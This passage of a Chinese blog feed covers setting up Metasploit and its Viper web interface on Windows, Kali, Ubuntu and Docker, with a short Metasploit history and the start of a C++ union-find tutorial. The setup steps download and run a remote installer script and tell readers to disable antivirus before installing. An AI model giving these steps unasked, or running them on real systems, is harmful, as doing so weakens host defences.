&lt;p&gt;如果你看到的命令是乱的  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20vcy9HZHpTSm5XRA==&#34;&gt;https://note.youdao.com/s/GdzSJnWD&lt;/span&gt;  看这个文档&lt;/p&gt;
&lt;p&gt;tee docker-compose.yml &amp;lt;&amp;lt;-&#39;EOF&#39; version: &amp;quot;3&amp;quot; services:  viper:    image: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZ2lzdHJ5LmNuLXNoZW56aGVuLmFsaXl1bmNzLmNvbS90b3lzL3ZpcGVyOmxhdGVzdA==&#34;&gt;registry.cn-shenzhen.aliyuncs.com/toys/viper:latest&lt;/span&gt;    container_name: viper-c    network_mode: &amp;quot;host&amp;quot;    restart: always    volumes:      - ${PWD}/loot:/root/.msf4/loot      - ${PWD}/db:/root/viper/Docker/db      - ${PWD}/module:/root/viper/Docker/module      - ${PWD}/log:/root/viper/Docker/log      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig    command: [&amp;quot;VIPER_PASSWORD&amp;quot;] EOF&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043385926.png&#34; alt=&#34;1640043385926&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;设置登录密码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Viper 不允许使用默认密码，diypassword 替换为自定义密码密码&lt;/p&gt;
&lt;p&gt;export VIPER_PASSWORD = 输入你的密码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043439186.png&#34; alt=&#34;1640043439186&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;写入密码到 docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;sed -i &amp;quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&amp;quot; docker-compose.yml&lt;/p&gt;
&lt;p&gt;#使用命令查看一下配置&lt;/p&gt;
&lt;p&gt;cat docker-compose.yml&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043478861.png&#34; alt=&#34;1640043478861&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建启动 Viper&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;cd $VIPER_DIR docker-compose up -d&lt;/p&gt;
&lt;p&gt;启动 viper&lt;/p&gt;
&lt;p&gt;docker-compose start&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043509764.png&#34; alt=&#34;1640043509764&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;等待 15s 系统启动，访问&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pcDo2MDAwMA==&#34;&gt;https://ip:60000&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;登录。用户名:root 密码：自定义密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在终端内输入  ip a 查看本机 ip&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;我的 IP 是 192.168.3.31  那么我在浏览器里就访问  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMuMzE6NjAwMDA=&#34;&gt;https://192.168.3.31:60000&lt;/span&gt;  登录名是  root  密码是  我上面设置的 root&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043540568.png&#34; alt=&#34;1640043540568&#34;&gt;&lt;/p&gt;
&lt;p&gt;例如： 我的 ip 是 192.168.3.31  那么访问炫彩蛇的 IP 就是 192.168.3.31:60000&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所有的 docker-compose 命令必须在安装目录执行才会有效果&lt;/strong&gt;&lt;/p&gt;
</content>
        <updated>2023-01-11T18:57:39.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/WINDOWS%E5%AE%89%E8%A3%85MSF/</id>
        <title>WINDOWS安装MSF</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/WINDOWS%E5%AE%89%E8%A3%85MSF/"/>
        <content type="html">&lt;h1 id=&#34;1-下载metasploit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-下载metasploit&#34;&gt;#&lt;/a&gt; 1  下载 metasploit&lt;/h1&gt;
&lt;p&gt;首先咱们进入 metasploit 官网&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWV0YXNwbG9pdC5jb20v&#34;&gt;https://www.metasploit.com/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/de0dfa24cf144e319e9817208d796e67.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击 Download  下载&lt;/p&gt;
&lt;p&gt;或者直接访问这个 地址&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWV0YXNwbG9pdC5jb20vZG93bmxvYWQ=&#34;&gt;https://www.metasploit.com/download&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;进入这个页面  点击 Metasploit Framework  下面的 Download&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/40c70142eedd4ee7b6a132a84426dd1f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;会访问这个地址&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay93aWtpL05pZ2h0bHktSW5zdGFsbGVycw==&#34;&gt;https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;如果你不能打开 GitHub 我们可以通过镜像服务器 访问&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZmFzdGdpdC5vcmcvcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL3dpa2kvTmlnaHRseS1JbnN0YWxsZXJz&#34;&gt;https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/a6096a53fc0f411fa7d4a1ecb32bea1a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这边给大家提供更多的国内可用镜像&lt;/p&gt;
&lt;p&gt;#官网镜像（可以用来 clone push 等，但是不能登录）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLmNucG1qcy5vcmcv&#34;&gt;https://github.com.cnpmjs.org/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXQuc2R1dC5tZS8=&#34;&gt;https://git.sdut.me/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;#github 常用的镜像&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZmFzdGdpdC5vcmc=&#34;&gt;https://hub.fastgit.org&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXQuc2R1dC5tZS8=&#34;&gt;https://git.sdut.me/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dpdGh1Yi1taXJyb3IuYnVna2lsbGVyLm9yZy8=&#34;&gt;http://github-mirror.bugkiller.org/&lt;/span&gt;&lt;br&gt;
#api 镜像&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcGkuZ2l0LnNkdXQubWUv&#34;&gt; https://api.git.sdut.me/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;然后找到 Windows 版本的下载&lt;/p&gt;
&lt;p&gt;点击 latest Windows installer 下载  最新版本&lt;/p&gt;
&lt;p&gt;点击  view older builds   下载历史版本&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/cd3b851b93854b55b549028fa9fb61f9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-安装metasploit并配置环境变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-安装metasploit并配置环境变量&#34;&gt;#&lt;/a&gt; 2 安装 metasploit 并配置环境变量&lt;/h1&gt;
&lt;p&gt;安装前关闭 win 自带的杀毒 和卸载第三方杀毒&lt;/p&gt;
&lt;p&gt;添加环境变量&lt;/p&gt;
&lt;p&gt;C:\metasploit-framework\bin&lt;/p&gt;
&lt;h1 id=&#34;3-启动并使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-启动并使用&#34;&gt;#&lt;/a&gt; 3 启动并使用&lt;/h1&gt;
&lt;p&gt;首次启动 需要初始化数据库&lt;/p&gt;
&lt;p&gt;终端中输入 msfdb init&lt;/p&gt;
&lt;p&gt;启动 MSF 框架&lt;/p&gt;
&lt;p&gt;终端中输入 msfconsole&lt;/p&gt;
</content>
        <updated>2023-01-11T18:35:20.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/KALI%E6%9B%B4%E6%96%B0MSF/</id>
        <title>KALI更新MSF</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/KALI%E6%9B%B4%E6%96%B0MSF/"/>
        <content type="html">&lt;p&gt;登录 kali&lt;/p&gt;
&lt;h1 id=&#34;1-打开终端获取root权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-打开终端获取root权限&#34;&gt;#&lt;/a&gt; 1 打开终端获取 root 权限&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;获取root权限 可以在终端 输入 sudo su  然后输入登录密码获取root权限&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-开始更新&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-开始更新&#34;&gt;#&lt;/a&gt; 2 开始更新&lt;/h1&gt;
&lt;p&gt;首先先添加更新源&lt;/p&gt;
&lt;p&gt;进入 etc/apt/   目录&lt;/p&gt;
&lt;p&gt;打开 sources.list   需要使用 root 权限执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/777269e6dc9143718ac9080d4650d0c7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMudXN0Yy5lZHUuY24va2FsaQ==&#34;&gt;http://mirrors.ustc.edu.cn/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMudXN0Yy5lZHUuY24va2FsaQ==&#34;&gt;http://mirrors.ustc.edu.cn/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
&lt;p&gt;#阿里云 kali 更新源&lt;/p&gt;
&lt;p&gt;deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9rYWxp&#34;&gt;http://mirrors.aliyun.com/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9rYWxp&#34;&gt;http://mirrors.aliyun.com/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
&lt;p&gt;#163 DEBIAN 源&lt;/p&gt;
&lt;p&gt;deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy main non-free contrib&lt;/p&gt;
&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy main non-free contrib deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy-proposed-updates main non-free contrib&lt;/p&gt;
&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy-proposed-updates main non-free contrib&lt;/p&gt;
&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4tc2VjdXJpdHk=&#34;&gt;http://mirrors.163.com/debian-security&lt;/span&gt; wheezy/updates main non-free contrib&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/c9eeca42087541a09f20a8078d8064c7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;​                apt-get update&lt;/p&gt;
&lt;p&gt;​                apt-get  install metasploit-framework&lt;/p&gt;
&lt;h1 id=&#34;3-如果更新时显示update无效的错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-如果更新时显示update无效的错误&#34;&gt;#&lt;/a&gt; 3 如果更新时显示 update 无效的错误！&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/dea81b359ad14271b35fbc7db0609126.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入下面几个命令修复&lt;/p&gt;
&lt;p&gt;wget -q -O - &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcmNoaXZlLmthbGkub3JnL2FyY2hpdmUta2V5LmFzYw==&#34;&gt;https://archive.kali.org/archive-key.asc&lt;/span&gt; | apt-key add&lt;/p&gt;
&lt;p&gt;apt-get clean&lt;/p&gt;
&lt;p&gt;apt-get update&lt;/p&gt;
&lt;p&gt;4 如果报：E: Unmet dependencies. Try &#39;apt --fix-broken install&#39; with no packages (or specify a solution).&lt;/p&gt;
&lt;p&gt;​                apt --fix-broken install&lt;/p&gt;
</content>
        <updated>2023-01-11T18:30:56.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/Linux%E5%AE%89%E8%A3%85MSF/</id>
        <title>Linux安装MSF</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/Linux%E5%AE%89%E8%A3%85MSF/"/>
        <content type="html">&lt;p&gt;&lt;strong&gt;1 乌班图安装 MSF&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;环境准备：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;vm 虚拟机&lt;/p&gt;
&lt;p&gt;Ubuntu 桌面版镜像&lt;/p&gt;
&lt;p&gt;打开终端  输入 sudo su  获取 root 权限&lt;/p&gt;
&lt;p&gt;然后输入命令&lt;/p&gt;
&lt;p&gt;curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LW9tbmlidXMvbWFzdGVyL2NvbmZpZy90ZW1wbGF0ZXMvbWV0YXNwbG9pdC1mcmFtZXdvcmstd3JhcHBlcnMvbXNmdXBkYXRlLmVyYg==&#34;&gt;https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb&lt;/span&gt; &amp;gt; msfinstall&lt;/p&gt;
&lt;p&gt;然后赋 755 权限 并执行安装&lt;/p&gt;
&lt;p&gt;chmod 755 msfinstall &amp;amp;&amp;amp; ./msfinstall&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2 直接安装 kali 系统&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第一种 vm 虚拟机 kali&lt;/p&gt;
&lt;p&gt;第二种 iso 安装镜像&lt;/p&gt;
&lt;p&gt;首先咱们进入 kali 官网下载 kali&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2FsaS5vcmcvZ2V0LWthbGkvI2thbGktYmFyZS1tZXRhbA==&#34;&gt;https://www.kali.org/get-kali/#kali-bare-metal&lt;/span&gt;  选择安装版镜像&lt;/p&gt;
&lt;p&gt;![1639993881805](02 Linux 安装 msf.assets/1639993881805.png)&lt;/p&gt;
</content>
        <updated>2023-01-11T18:29:36.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/MSF%E5%8F%91%E5%B1%95%E5%8F%B2/</id>
        <title>MSF发展史</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/MSF%E5%8F%91%E5%B1%95%E5%8F%B2/"/>
        <content type="html">&lt;h1 id=&#34;1-metasploit-发展史&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-metasploit-发展史&#34;&gt;#&lt;/a&gt; 1 Metasploit - 发展史&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/418450a2cc3143c2bb296f73eccb131d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Metasploit 框架使 Metasploit 具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit 框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前 BO2K 等工具所具备的功能。&lt;/p&gt;
&lt;h2 id=&#34;2004年&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2004年&#34;&gt;#&lt;/a&gt; 2004 年&lt;/h2&gt;
&lt;p&gt;2004 年 8 月，在拉斯维加斯开了一次世界黑客交流会 -- 叫黑帽简报（Black Hat Briefings). 在这个会议上，一款叫 Metasploit 的攻击和渗透工具备受众黑客关注，出尽了风头。 Metasploit 是同 HD Moore 和 Spoonm 等 4 名年轻人开发的，这款免费软件可以帮助黑客攻击和控制计算机，安全人员也可以利用 Metasploit 来加强系统对此类工具的攻击。Metasploit 的演示吸引了来自 “美国国防部” 和 “国家安全局” 等政府机构的众多安全顾问和个人，正如 Spoonm 在演讲中所说的，Metasploit 很简单，只需要求 “找到目标，单击和控制” 即可。 2004 年 Metasploit 的发布在安全界引发了强烈的 “地震”。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/a3d942aff8ef42949af2523afdc7fb00.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2005年&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2005年&#34;&gt;#&lt;/a&gt; 2005 年&lt;/h2&gt;
&lt;p&gt;2005 年 6 月，西雅图效区的微软公司总部园区内的管理情报中心，开了一次 “蓝帽” 会议。几百名微软公司的工程师和众多外界专家及黑客都被邀请进入微软帝国的中心。在会议中的黑客攻击演示中，当 Moore 向系统程序员们说明使用 Metasploit 测试系统对抗入侵的可靠程度时，Metasploit 让微软公司的开发人员再次感到不安。在程序员们看来，Metasploit 将会使系统安全面临严重的考验。 Metasploit (MSF) 在 2003 年以开放源码方式发布，是可以自由获取的开发框架。它是一个强大的开源平台，提供开发，测试和使用恶意代码，这个环境为渗透测试，为 shellcode 编写和漏洞研究提供了一个可靠平台。 Metasploit 框架直到 2006 年发布的 2.7 版本都用 Perl 脚本语言编写，由于 Perl 的一些缺陷，开发者于 2007 年底使用 Ruby 语言重写了该框架。到 2007 年年底，Spoonm 和马特・米勒已经离开了项目。从 2008 年发布的 3.2 版本开始，该项目采用新的 3 段式 BSD 许可证。&lt;/p&gt;
&lt;h2 id=&#34;2009年&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2009年&#34;&gt;#&lt;/a&gt; 2009 年&lt;/h2&gt;
&lt;p&gt;2009 年 10 月 21 号，漏洞管理解决公司 Rapid7 收购 Metasploit 项目。Rapid7 承诺成立专职开发团队，仍然将源代码置于 3 段式 BSD 许可证下。&lt;/p&gt;
&lt;h1 id=&#34;2-bsd许可证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-bsd许可证&#34;&gt;#&lt;/a&gt; 2 BSD 许可证&lt;/h1&gt;
&lt;p&gt;相较于 GPL 许可证和 MPL 许可证的严格性，BSD 许可证就宽松许多了，一样是只需要附上许可证的原文，不过比较有趣的是，它还要求所有进一步开发者将自己的版权资料放上去，所以拿到以 BSD 许可证发行的软件可能会遇到一个小状况，就是这些版权资料许可证占的空间比程序还大。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/9bc54e5da27644769e8c59836a95aa0c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-metasploit发展前景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-metasploit发展前景&#34;&gt;#&lt;/a&gt; 3 Metasploit 发展前景&lt;/h1&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/53ecab99591140878359777a3039a423.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
        <updated>2023-01-11T18:28:13.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/12/CPP%E5%B9%B6%E6%9F%A5%E9%9B%86/</id>
        <title>CPP并查集</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/12/CPP%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
        <content type="html">&lt;h1 id=&#34;c并查集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#c并查集&#34;&gt;#&lt;/a&gt; C++ 并查集&lt;/h1&gt;
&lt;h2 id=&#34;1并查集简介及构成&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1并查集简介及构成&#34;&gt;#&lt;/a&gt; 1. 并查集简介及构成：&lt;/h2&gt;
&lt;p&gt;并查集是一种树型的数据结构，用于处理一些不相交集合的合并及查询问题。合并及查询即代表 &amp;quot;并&amp;quot; 和 &amp;quot;查&amp;quot;。&lt;/p&gt;
&lt;p&gt;并查集由一个整数数组 parent []，两个函数 find 和 connect 构成。&lt;/p&gt;
&lt;p&gt;parent [] 数组记录每一个元素的前驱节点是什么，find 用于查找指定元素属于哪个集合 (表现形式一般为查找该元素的根节点)，connect 用于连接两个集合 (表现形式一般为根节点不一样的两个元素)。&lt;/p&gt;
&lt;p&gt;构建并查集的命名可以和上述不同。比如 parent 可以根据实际意义改为 father,root 等等。find 一般不需要修改名称，因为在几乎所有的场景这个函数都代表查找的意思。connect 也可以叫 union 等等。&lt;/p&gt;
&lt;p&gt;并查集的主要作用是求连通分支数，比如无向图有多少连通分支，图中 A 和 B 两个顶点是否连通等。&lt;/p&gt;
&lt;h2 id=&#34;2构建并查集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2构建并查集&#34;&gt;#&lt;/a&gt; 2. 构建并查集：&lt;/h2&gt;
&lt;h3 id=&#34;21-数组初始化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-数组初始化&#34;&gt;#&lt;/a&gt; 2.1 数组初始化：&lt;/h3&gt;
&lt;p&gt;一般情况数组 parent 初始化时将所有元素设为自己，但是也有特殊情况。比如各种岛屿包围的问题。具体情况要具体看。&lt;/p&gt;
&lt;p&gt;对于数据是 int 型元素构建并查集可以使用数组，但是有时我们要为字符串等其它类型元素构建并查集，因此很多时候需要使用哈希，即 unordered_map 来做数组存储。&lt;/p&gt;
&lt;h3 id=&#34;22-find函数的构建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-find函数的构建&#34;&gt;#&lt;/a&gt; 2.2 find 函数的构建：&lt;/h3&gt;
&lt;p&gt;find 作用是查找元素最前面的前驱元素。代码如下：&lt;br&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int find(int&amp;amp; node,vector&amp;lt;int&amp;gt;&amp;amp; parent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int q=node;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while(parent[q]!=q)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        q=parent[q];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这段代码还是很好理解的。此时 find 复杂度最坏为 O (n)，平均为 O (logN)。&lt;/p&gt;
&lt;h2 id=&#34;23-connect函数的构建&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23-connect函数的构建&#34;&gt;#&lt;/a&gt; 2.3 connect 函数的构建：&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;void connect(int&amp;amp; node1,int&amp;amp; 